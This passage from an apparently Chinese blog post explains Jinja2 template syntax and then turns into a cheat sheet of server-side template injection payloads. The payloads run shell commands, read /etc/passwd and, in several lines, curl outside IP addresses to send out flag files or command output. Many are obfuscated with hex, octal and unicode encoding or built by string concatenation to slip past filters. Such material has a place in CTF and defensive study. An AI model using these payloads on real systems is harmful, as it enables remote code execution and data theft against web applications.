id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p>有关过滤器：<a href="https://jinja.palletsprojects.com/en/3.1.x/templates/#builtin-filters">https://jinja.palletsprojects.com/en/3.1.x/templates/#builtin-filters</a></p><p>过滤器可以理解为是 jinja2 里面内置的函数和字符串处理函数，它能够</p><ul><li><strong>修饰变量</strong>(支持参数)</li><li><strong>支持链式调用</strong>。</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-string">&#x27;&#x27;&#x27;1.修饰变量&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># foo.bar</span><br>&#123;&#123;foo&#124;attr(<span class="hljs-string">&quot;bar&quot;</span>)&#125;&#125; <br><span class="hljs-comment"># &quot;%s, %s!&quot; % (greeting, name)</span><br>&#123;&#123;<span class="hljs-string">&quot;%s, %s!&quot;</span>&#124;<span class="hljs-built_in">format</span>(greeting, name)&#125;&#125;<br><span class="hljs-comment"># [1, 2, 3].join(&#x27;&#124;&#x27;)</span><br>&#123;&#123;[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]&#124;join(<span class="hljs-string">&#x27;&#124;&#x27;</span>)&#125;&#125;<br><br><span class="hljs-string">&#x27;&#x27;&#x27;2.链式调用，即前一个过滤器的输出作为后一个过滤器的输入&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># title(striptags(name))</span><br>&#123;&#123; name&#124;striptags&#124;title &#125;&#125;<br></code></pre></td></tr></table></figure><h4 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h4><p>可以在jinja2模板中自定义宏(函数)，并在渲染后使用，如下所示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--定义宏函数hack()--&gt;</span><br>&#123;% macro hack(name=&quot;xxx&quot;) %&#125;<br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span> Hacked by &#123;&#123; name &#125;&#125; <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>&#123;% endmacro %&#125;<br><br><span class="hljs-comment">&lt;!--call--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> &#123;&#123; hack(&#x27;alice&#x27;) &#125;&#125; <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> &#123;&#123; hack() &#125;&#125; <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h4><p>模板继承允许我们创建一个骨架文件，其他文件从该骨架文件继承。骨架文件中<code>block</code>关键字表示其包含的内容可以修改。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--骨架文件--&gt;</span><br><span class="hljs-comment">&lt;!--base.html--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    &#123;% block head %&#125;<br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>&#123;% block title %&#125;&#123;% endblock %&#125; - Home<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    &#123;% endblock %&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span>&#123;% block content %&#125;&#123;% endblock %&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;footer&quot;</span>&gt;</span><br>        &#123;% block  footer %&#125;<br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>This is javascript<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>        &#123;% endblock %&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--继承base.html--&gt;</span><br>&#123;% extends &quot;base.html&quot; %&#125;  <span class="hljs-comment">&lt;!-- 继承 --&gt;</span><br>&#123;% block title %&#125; Tr0y&#x27;s Blog &#123;% endblock %&#125;  <span class="hljs-comment">&lt;!-- title 自定义 --&gt;</span><br>&#123;% block head %&#125;<br>    &#123;&#123; super() &#125;&#125;  <span class="hljs-comment">&lt;!-- 用于获取原有的信息 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text/css&#x27;</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-class">.important</span> &#123; <span class="hljs-attribute">color</span>: <span class="hljs-number">#FFFFFF</span> &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>&#123;% endblock %&#125;   <br> <br><span class="hljs-comment">&lt;!-- 其他不修改的原封不动的继承 --&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#渲染</span><br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> FileSystemLoader, Environment<br><br>env = Environment(loader=FileSystemLoader(<span class="hljs-string">&quot;./&quot;</span>))<br><span class="hljs-built_in">print</span>(env.get_template(<span class="hljs-string">&quot;extend.html&quot;</span>).render())<br></code></pre></td></tr></table></figure><h1 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h1><p>@TODO</p><p>参考link：<a href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93">沙盒逃逸总结</a></p><h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><ol><li>注入点–获取特殊类–<code>os.popen()</code></li><li>注入点–基类obj–基类obj的子类–<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>– 加上<code>__init__.__golbals__[&#39;popen&#39;][ls].read()</code></li></ol><h2 id="特殊类"><a href="#特殊类" class="headerlink" title="特殊类"></a>特殊类</h2><p>可利用的特殊类分为三种</p><ul><li>含os的内置类</li><li>未定义类</li><li>jinja2内置函数</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;&#123;config.__class__.__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;dir&#x27;</span>).read()&#125;&#125; <br><br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;dir&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;url_for.__globals__.os.popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;get_flashed_messages.__globals__.os.popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;url_for.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;cycler.__init__.__globals__.os.popen(<span class="hljs-string">&#x27;dir&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;x.__init__.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br><span class="hljs-comment">#例如</span><br><span class="hljs-comment">#&#123;&#123;jacko_god.__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><br><span class="hljs-comment">#&#123;&#123;jacko&#124;attr(&quot;__init__&quot;)&#124;attr(&quot;__globals__&quot;)&#124;attr(&quot;__getitem__&quot;)(&quot;__builtins__&quot;)&#124;attr(&quot;__getitem__&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl 175.24.73.30:2333?flag=`cat /f1agggghere`&#x27;).read()&quot;)&#125;&#125;</span><br><br><span class="hljs-comment">#也就是</span><br><span class="hljs-comment">#jacko.__init__.__globals__.__getitem__[&quot;__builtins__&quot;].__getitem__[&quot;eval&quot;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl 175.24.73.30:2333?flag=`cat /f1agggghere`&#x27;).read()&quot;)</span><br><br>&#123;&#123;x.__init__.__globals__.__builtins__.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;config[<span class="hljs-string">&#x27;__init__&#x27;</span>][<span class="hljs-string">&#x27;__globals__&#x27;</span>][<span class="hljs-string">&#x27;os&#x27;</span>][<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;ls /&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;<br><br>&#123;&#123;(config&#124;attr(<span class="hljs-string">&#x27;__init__&#x27;</span>)&#124;attr(<span class="hljs-string">&#x27;__globals__&#x27;</span>)).os.popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="常规思路"><a href="#常规思路" class="headerlink" title="常规思路"></a>常规思路</h2><p>不同于利用特殊类，<strong>本节中的攻击思路都需要对子类进行遍历</strong>，以获取目标类。</p><blockquote><p>⭐想获取模块的索引可以使用index()，如获取file模块的索引</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__().index(file) <span class="hljs-comment"># 40</span><br></code></pre></td></tr></table></figure></blockquote><ol><li>注入点&#x3D;&gt;基类obj&#x3D;&gt;基类obj的子类&#x3D;&gt;不带wrapper的子类&#x3D;&gt;<code>__builtins__</code>&#x3D;&gt;获取到file执行文件读写</li><li>注入点&#x3D;&gt;基类obj&#x3D;&gt;基类obj的子类&#x3D;&gt;不带wrapper的子类&#x3D;&gt;<code>__builtins__</code>&#x3D;&gt;获取到eval、exec执行命令</li><li>注入点&#x3D;&gt;基类obj&#x3D;&gt;基类obj的子类&#x3D;&gt;不带wrapper的子类&#x3D;&gt;<code>warnings.catch_warnings</code></li></ol><h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#通过内置类&#x27;__builtins__&#x27;获取file</span><br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;file&#x27;</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()    <br><br><span class="hljs-comment">#通过基类&#x27;__base__&#x27;获取file</span><br>[].__class__.__base__.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read() <br><span class="hljs-comment">#将read() 修改为 write() 即为写文件</span><br></code></pre></td></tr></table></figure><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#使用eval执行命令</span><br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>)<br><br><span class="hljs-comment">#使用warnings.catch_warnings中的system执行命令</span><br>[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__.values()[<span class="hljs-number">12</span>].__dict__.values()[<span class="hljs-number">144</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="闭合符"><a href="#闭合符" class="headerlink" title="闭合符"></a>闭合符</h2><p>基础语法里提到了三种闭合方式控制语句<code>&#123;%...%&#125;</code>、表达式<code>&#123;&#123;...&#125;&#125;</code>、注释&#96;&#96;，其中<strong>控制语句</strong>支持几种语法：</p><ul><li><p><code>&#123;% macro %&#125;</code>：宏，后面单独提。</p></li><li><p><code>&#123;% print(...) %&#125;</code>：打印输出，如：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">133</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&quot;whoami&quot;</span>)) %&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>&#123; %if ... &#125;...&#123; %endif &#125;</code>：条件语句</p></li><li><p><code>&#123;% set %&#125;</code></p></li><li><p><code>&#123;% for %&#125;</code></p></li></ul><h2 id="下划线"><a href="#下划线" class="headerlink" title="下划线 _"></a>下划线 _</h2><p>下划线可以使用十六进制进行替换，不过不能用<code>.</code>取值因为只有字符串格式能识别十六进制，需要换成中括号<code>[]</code>格式即</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#.__init__.__globals__ 等价于</span><br>.__init__[<span class="hljs-string">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>]<br></code></pre></td></tr></table></figure><h2 id="中括号"><a href="#中括号" class="headerlink" title="中括号 []"></a>中括号 []</h2><p>pop() 函数用于移除列表中的一个元素，并返回该元素的值，因此可以取代中括号取值。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="hljs-number">2</span>).__subclasses__().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()<br></code></pre></td></tr></table></figure><h2 id="点"><a href="#点" class="headerlink" title="点 ."></a>点 .</h2><p>可以使用以下几种方式作为替代</p><ul><li>中括号<code>[]</code></li><li>过滤器取属性：<code>|attr</code>、<code>|map</code></li><li><code>__getattribute__</code></li><li><code>getattr</code></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#使用中括号，xxx.__xxx__.__xxxx__等价于</span><br>xxx[<span class="hljs-string">&#x27;__xxx__&#x27;</span>].__xxxx___ <br>xxx[<span class="hljs-string">&#x27;__xxx__&#x27;</span>][<span class="hljs-string">&#x27;__xxx__&#x27;</span>]<br><br><span class="hljs-comment">#使用过滤器attr，xxx.__xxx__等价于</span><br>xxx&#124;attr(<span class="hljs-string">&#x27;__xxx__&#x27;</span>)<br><br><span class="hljs-comment">#使用过滤器map，1.__class__等价于</span><br> [<span class="hljs-number">1</span>] &#124; <span class="hljs-built_in">map</span>(attribute=<span class="hljs-string">&quot;__class__&quot;</span>)&#124; <span class="hljs-built_in">list</span> &#124; first <span class="hljs-comment"># map需要可迭代对象，所以要使用list，并取首值。</span><br>    <br><span class="hljs-comment">#使用__getattribute__，xxx.__xxx__等价于</span><br>xxx.__getattribute__(<span class="hljs-string">&quot;__xxx__&quot;</span>)<br><br><span class="hljs-comment">#使用getattr，xxx.__xxx__等价于</span><br><span class="hljs-built_in">getattr</span>(xxx, <span class="hljs-string">&quot;__xxx__&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>编码<strong>只有在字符串中才可以识别</strong>，因此要用括号或中括号包裹，。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#hex：a =&gt; \x61</span><br>url_for.__globals__.os.popen(<span class="hljs-string">&#x27;who\x61mi&#x27;</span>).read()<br><span class="hljs-comment">#oct: a =&gt; \141</span><br>url_for.__globals__.os.popen(<span class="hljs-string">&#x27;who\141mi&#x27;</span>).read()<br><span class="hljs-comment">#base64 </span><br>&#123;&#123;[].__getattribute__(<span class="hljs-string">&#x27;X19jbGFzc19f&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)).__base__.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&quot;/etc/passwd&quot;</span>).read()&#125;&#125;<br><span class="hljs-comment">#unicode: a =&gt; \u0061</span><br>url_for.__globals__.os.popen(<span class="hljs-string">&#x27;who\u0061mi&#x27;</span>).read()<br></code></pre></td></tr></table></figure><p>再结合过滤器，就可以实现对<code>.</code>、<code>[]</code>、以及关键字的绕过，比如</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#八进制配合过滤器</span><br>xx&#124;attr(<span class="hljs-string">&quot;\137\137\151\156\151\164\137\137&quot;</span>)&#124;attr(<span class="hljs-string">&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;</span>)&#124;attr(<span class="hljs-string">&quot;\137\137\147\145\164\151\164\145\155\137\137&quot;</span>)(<span class="hljs-string">&quot;\137\137\142\165\151\154\164\151\156\163\137\137&quot;</span>)&#124;attr(<span class="hljs-string">&quot;\137\137\147\145\164\151\164\145\155\137\137&quot;</span>)(<span class="hljs-string">&quot;\145\166\141\154&quot;</span>)(<span class="hljs-string">&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\143\165\162\154\40\150\164\164\160\72\57\57\70\56\61\62\71\56\64\62\56\61\64\60\72\63\63\60\67\47\51\56\162\145\141\144\50\51&quot;</span>)<br><span class="hljs-comment">#curl 8.129.42.140:3307</span><br><br><span class="hljs-comment">#unicode配合过滤器</span><br><span class="hljs-string">&quot;&quot;</span>&#124;attr(<span class="hljs-string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)&#124;attr(<span class="hljs-string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>)&#124;attr(<span class="hljs-string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="hljs-number">0</span>)&#124;attr(<span class="hljs-string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>)()&#124;attr(<span class="hljs-string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="hljs-number">133</span>)&#124;attr(<span class="hljs-string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>)&#124;attr(<span class="hljs-string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)&#124;attr(<span class="hljs-string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="hljs-string">&quot;\u0070\u006f\u0070\u0065\u006e&quot;</span>)(<span class="hljs-string">&quot;\u0063\u0075\u0072\u006c\u0020\u0034\u0037\u002e\u0031\u0030\u0031\u002e\u0035\u0037\u002e\u0037\u0032\u003a\u0032\u0033\u0033\u0033\u0020\u002d\u0064\u0020\&quot;`\u006c\u0073\u0020\u002f`\&quot;&quot;</span>)&#124;attr(<span class="hljs-string">&quot;\u0072\u0065\u0061\u0064&quot;</span>)() <br><span class="hljs-comment"># curl 47.xxx.xxx.72:2333 -d \&quot;`ls /`\&quot;</span><br></code></pre></td></tr></table></figure><h3 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">url_for.__globals__.os.popen(&#x27;whoami&#x27;).read() 等价于</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#+</span><br>url_for.__globals__.os.popen(<span class="hljs-string">&#x27;who&#x27;</span>+<span class="hljs-string">&#x27;ami&#x27;</span>).read()<br><span class="hljs-comment">#~</span><br>url_for.__globals__.os.popen(<span class="hljs-string">&#x27;who&#x27;</span>~<span class="hljs-string">&#x27;ami&#x27;</span>).read()<br><span class="hljs-comment">#%(格式化字符串)</span><br>url_for.__globals__.os.popen(<span class="hljs-string">&#x27;who%s&#x27;</span>%<span class="hljs-string">&#x27;ami&#x27;</span>).read()<br>url_for.__globals__.os.popen(<span class="hljs-string">&#x27;w%s%s&#x27;</span>%(<span class="hljs-string">&#x27;ho&#x27;</span>,<span class="hljs-string">&#x27;ami&#x27;</span>)).read()<br><span class="hljs-comment">#过滤器format(格式化字符串)</span><br>url_for.__globals__.os.popen(<span class="hljs-string">&#x27;%s%s&#x27;</span>&#124;<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;who&#x27;</span>,<span class="hljs-string">&#x27;ami&#x27;</span>)).read()<br><span class="hljs-comment">#join</span><br>url_for.__globals__.os.popen([<span class="hljs-string">&#x27;who&#x27;</span>,<span class="hljs-string">&#x27;ami&#x27;</span>]&#124;join).read()<br><span class="hljs-comment">#__add__</span><br>url_for.__globals__.os.popen(<span class="hljs-string">&#x27;who&#x27;</span>.__add__(<span class="hljs-string">&#x27;ami&#x27;</span>)).read()<br><span class="hljs-comment">#dict&amp;过滤器join</span><br><span class="hljs-built_in">dict</span>(__buil=a,tins__=a)&#124;join<br></code></pre></td></tr></table></figure><h3 id="request模块绕过"><a href="#request模块绕过" class="headerlink" title="request模块绕过"></a>request模块绕过</h3><p>借用request模块二次传递关键字绕过，见附录jinja2内置类。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#&#123;&#123;&#x27;&#x27;.__class__&#125;&#125; 等价于</span><br>&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>[request.args.t1]&#125;&#125;&amp;t1=__class__<br>&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>[request[<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-string">&#x27;t1&#x27;</span>]]&#125;&#125;&amp;t1=__class_<br></code></pre></td></tr></table></figure><h3 id="其它执行模块绕过"><a href="#其它执行模块绕过" class="headerlink" title="其它执行模块绕过"></a>其它执行模块绕过</h3><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">xxx.__init__.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="exec-无回显"><a href="#exec-无回显" class="headerlink" title="exec(无回显)"></a>exec(无回显)</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">xxx.__init__.__globals__.__builtins__.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;curl 101.xx.xx.xx:6677/`id`&quot;).read()&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><blockquote><p>eval, execfile, compile, open, file, map, input, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe, os.listdir, os.access, os.execl, os.execle, os.execlp, os.execlpe, os.execv, os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads,cPickle.load,cPickle.loads</p></blockquote><h3 id="格式化字符绕过"><a href="#格式化字符绕过" class="headerlink" title="格式化字符绕过"></a>格式化字符绕过</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#a</span><br>&#123;&#123;<span class="hljs-string">&quot;&#123;0:c&#125;&quot;</span>[<span class="hljs-string">&#x27;format&#x27;</span>](<span class="hljs-number">97</span>)&#125;&#125;<br><br><span class="hljs-comment">#__class__</span><br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&#x27;&#123;0:c&#125;&#x27;</span>[<span class="hljs-string">&#x27;format&#x27;</span>](<span class="hljs-number">95</span>)%2<span class="hljs-string">b&#x27;&#123;0:c&#125;&#x27;</span>[<span class="hljs-string">&#x27;format&#x27;</span>](<span class="hljs-number">95</span>)%2<span class="hljs-string">b&#x27;&#123;0:c&#125;&#x27;</span>[<span class="hljs-string">&#x27;format&#x27;</span>](<span class="hljs-number">99</span>)%2<span 